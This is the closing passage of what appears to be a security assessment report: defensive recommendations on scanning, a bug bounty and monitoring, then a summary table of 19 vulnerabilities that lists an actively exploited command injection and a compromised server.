2. **SAST/DAST**: Implement automated security scanning in CI/CD
3. **Bug Bounty**: Consider a responsible disclosure program
4. **Monitoring**: Implement SIEM for security event monitoring

---

## Report Summary

| Item | Value |
|------|-------|
| Total Vulnerabilities | 19 |
| Critical | 5 |
| High | 8 |
| Medium | 5 |
| Low | 1 |
| Actively Exploited | Yes (Command Injection) |
| Server Status | Compromised |
| Immediate Action | Required |

---

**End of Report**

*This report should be treated as CONFIDENTIAL and shared only with authorized personnel.*
